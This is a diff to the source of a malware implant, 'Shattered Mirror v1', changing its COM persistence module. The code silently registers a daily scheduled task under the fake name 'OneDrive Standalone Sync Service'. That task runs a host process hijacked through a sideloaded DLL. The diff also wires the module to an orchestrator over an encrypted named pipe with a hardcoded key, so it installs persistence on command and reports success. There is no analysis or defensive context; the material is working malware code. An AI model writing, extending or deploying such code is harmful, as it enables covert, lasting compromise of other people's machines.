@@ -1,4 +1,4 @@
-/*=============================================================================
+﻿/*=============================================================================
  * Shattered Mirror v1 — Atom 07: COM Persistence
  *
  * Implements COM ITaskService to silently register a daily scheduled task
@@ -6,8 +6,10 @@
  *===========================================================================*/
 
 #include "Atom_07_Persist.h"
+#include "../Orchestrator/AtomManager.h"
 #include <taskschd.h>
 #include <comdef.h>
+#include <cstring>
 
 #pragma comment(lib, "taskschd.lib")
 #pragma comment(lib, "comsupp.lib")
@@ -149,16 +151,33 @@ BOOL CreateScheduledTaskCOM(LPCWSTR pwszTaskName, LPCWSTR pwszExecutablePath) {
     return SUCCEEDED(hr);
 }
 
-DWORD WINAPI PersistAtomMain(LPVOID lpParam) {
-    /* 
-     * Identify the path of the host process (which should be hijacked already
-     * since we are inside it, e.g. OneDrive.exe with our version.dll next to it)
-     */
-    WCHAR szMyPath[MAX_PATH] = { 0 };
-    GetModuleFileNameW(NULL, szMyPath, MAX_PATH);
+DWORD WINAPI PersistenceAtomMain(LPVOID lpParam) {
+    DWORD dwAtomId = (DWORD)(ULONG_PTR)lpParam;
+    HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
+    if (!hPipe) return 1;
 
-    /* Register under a benign sounding name */
-    CreateScheduledTaskCOM(L"OneDrive Standalone Sync Service", szMyPath);
-    
+    BYTE SharedSessionKey[] = "KI4ns1N2S1M8Tknp";
+
+    while (TRUE) {
+        IPC_MESSAGE inMsg = { 0 };
+        if (IPC_ReceiveMessage(hPipe, &inMsg, SharedSessionKey, 16)) {
+            if (inMsg.CommandId == CMD_EXECUTE) {
+                WCHAR szMyPath[MAX_PATH] = { 0 };
+                GetModuleFileNameW(NULL, szMyPath, MAX_PATH);
+
+                if (CreateScheduledTaskCOM(L"OneDrive Standalone Sync Service", szMyPath)) {
+                    char report[] = "[PERSIST] Scheduled Task COM Installation SUCCESS.";
+                    IPC_MESSAGE outMsg = { 0 };
+                    outMsg.CommandId = CMD_REPORT;
+                    outMsg.dwPayloadLen = (DWORD)strlen(report);
+                    memcpy(outMsg.Payload, report, outMsg.dwPayloadLen);
+                    IPC_SendMessage(hPipe, &outMsg, SharedSessionKey, 16);
+                }
+            }
+        } else if (GetLastError() == ERROR_BROKEN_PIPE) {
+            break;
+        }
+        Sleep(1000);
+    }
     return 0;
 }
